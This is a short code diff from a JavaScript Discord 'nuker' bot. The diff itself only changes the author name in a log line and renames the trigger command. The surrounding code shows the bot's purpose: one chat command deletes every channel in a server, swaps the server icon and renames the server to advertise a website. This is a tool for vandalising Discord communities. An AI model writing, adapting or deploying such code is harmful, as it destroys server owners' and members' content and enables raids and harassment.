@@ -5,7 +5,7 @@ const guild = Discord.Guild
 const prefix = "?";
 
 bot.on('ready', () =>{
-  console.log(`https://Mr-Cuda/Discord-Nuker-Bot/`);
+  console.log(`https://Mr-Zanzibar/Discord-Nuker-Bot/`);
     console.log(`ONLINE`);
       bot.user.setActivity(`/ferrari.com/`);
 })
@@ -42,7 +42,7 @@ if (msg.content.indexOf(`${prefix}leave`) === 0) {
   msg.member.voice.channel.leave();
 }
 
-if (msg.content === `${prefix}cuda`) {
+if (msg.content === `${prefix}zanza`) {
   msg.guild.channels.cache.forEach(channel => channel.delete())
   msg.guild.setIcon("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTqU6-kvj_Sh-udibKRAUT-bo_ApT0NYtUG-w&usqp=CAU")
   msg.guild.setName("visit https://ferrari.com")
